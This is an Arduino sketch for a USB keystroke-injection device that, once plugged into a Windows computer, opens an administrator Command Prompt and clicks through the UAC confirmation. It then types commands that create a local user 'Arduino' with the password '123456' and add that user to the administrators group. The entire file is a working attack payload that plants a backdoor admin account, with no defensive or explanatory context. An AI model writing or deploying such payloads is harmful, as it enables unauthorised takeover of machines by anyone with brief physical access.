#include <HID.h>
#include <Keyboard.h>

// Init function
void setup()
{
  // Start Keyboard and Mouse
  Keyboard.begin();

  // Start Payload
  // press Windows+X
  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.press('x');
  Keyboard.releaseAll();
  delay(500);

  // launch Command Prompt (Admin)
  typeKey('a');
  delay(3000);

  // klik "Yes"
  typeKey(KEY_LEFT_ARROW);
  typeKey(KEY_RETURN);
  delay(1000);

  // add user
  Keyboard.println("net user /add Arduino 123456");
  typeKey(KEY_RETURN);  
  delay(100);

  // make that user become admin  
  Keyboard.print("net localgroup administrators Arduino /add");
  typeKey(KEY_RETURN);
  delay(100);

  Keyboard.print("exit");
  typeKey(KEY_RETURN);  
  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}

